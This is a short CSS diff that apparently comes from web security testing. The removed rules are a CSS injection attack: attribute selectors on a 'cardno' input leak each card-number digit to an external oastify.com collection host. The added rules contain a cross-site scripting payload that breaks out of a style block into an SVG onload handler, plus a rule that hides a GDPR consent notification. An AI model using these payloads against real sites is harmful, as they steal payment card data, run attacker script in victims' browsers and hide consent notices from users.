@@ -1,10 +1,13 @@
-input[name="cardno"][value^="1"] {
-    background: url(https://l2o7yrzb9i8gsqrx63xteoh79yfr3ir7.oastify.com/log?card=1);
+div  {
+    background-image: url("https://i.gyazo.com/4f984871ff7f9121d4368ed29a322ff3.png");
+    background-color: #cccccc;
 }
-input[name="cardno"][value^="2"] {
-    background: url(https://l2o7yrzb9i8gsqrx63xteoh79yfr3ir7.oastify.com/log?card=2);
+body {
+	background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
+	background-color: #FF0000;
+	
 }
-input[name="cardno"][value^="3"] {
-    background: url(https://l2o7yrzb9i8gsqrx63xteoh79yfr3ir7.oastify.com/log?card=3);
+._2brsq-_-_-client-components-gdpr-notification--notification-wrapper {
+	background-color: red;
+	visibility: hidden;
 }
-/* And so on for each possible value... */
